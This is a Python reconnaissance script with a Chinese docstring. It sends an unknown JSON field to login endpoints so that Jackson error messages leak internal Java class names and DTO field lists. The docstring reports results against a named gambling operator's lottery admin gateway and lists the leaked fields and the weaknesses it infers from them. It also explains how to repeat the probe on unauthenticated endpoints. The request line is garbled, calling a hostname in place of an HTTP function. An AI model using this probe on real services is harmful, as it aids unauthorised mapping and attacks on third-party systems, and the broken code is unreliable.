# -*- coding: utf-8 -*-
"""
Jackson FAIL_ON_UNKNOWN_PROPERTIES → 内部类名与 DTO 字段清单泄露
──────────────────────────────────────────────────────────────
【原理】Spring Boot 默认启用 Jackson 的 FAIL_ON_UNKNOWN_PROPERTIES。
向任意 @RequestBody 端点发一个**未被 DTO 声明的字段**，Jackson 抛异常时会把
*完整类名* 与 *该 DTO 的全部已知字段名* 一起写进错误消息 —— 这是极高效的
接口结构测绘手段，且往往在**未鉴权端点**上就能用。

【实测】6686 博彩集团彩票管理网关（无 token 端点）
  POST /ig-lottery/adminapi/agent/login
  {"account":"admin","password":"x","zzz_unknown":1}
→ 400 Unrecognized field "zzz_unknown"
       (class com.iglottery.admin.model.request.agent.LoginRequest),
       not marked as ignorable (12 known properties:
        "instanceID","adminDomain","adminServerDomain","captchaCode","isSport",
        "password","account","lottery_sign","googleCode","ipAddress","env","lotterySign")
       at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled);
       line: 1, column: 55]
       (through reference chain: com.iglottery.admin.model.request.agent.LoginRequest["zzz_unknown"])

【拿到什么】
  · Java 包结构：com.iglottery.admin.model.request.agent
  · DTO 字段全清单（12 个）
  · Jackson 配置（FAIL_ON_UNKNOWN_PROPERTIES=true / INCLUDE_SOURCE_IN_LOCATION=disabled）
  · 由字段名可推断大量业务语义与潜在弱点（签名双字段、googleCode 2FA、
    ipAddress 自报 IP、env 环境标识）

【复用方法】
  对目标每个 POST 端点（**优先未鉴权/无需 token 的**）发：
      {"account":"x","password":"x","zzz_probe_xxxx":1}
  看响应是否回吐 class <完整包名> 与 (N known properties: "f1","f2",...)
"""
import json, sys
from curl_cffi import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36")


def probe(url, extra_field="zzz_probe_redteam", base_body=None, origin=None):
    body = dict(base_body or {"account": "admin", "password": "x"})
    body[extra_field] = 1
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if origin:
        h["Origin"] = origin
        h["Referer"] = origin + "/"
    r = target9.example.com(url, headers=h, data=json.dumps(body), timeout=15,
                      impersonate="chrome", verify=False, allow_redirects=False)
    return r.status_code, r.text


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else \
        "https://example.com/ig-lottery/adminapi/agent/login"
    sc, t = probe(url, origin="https://example.com")
    print("[%s]" % sc)
    print(t[:1200])
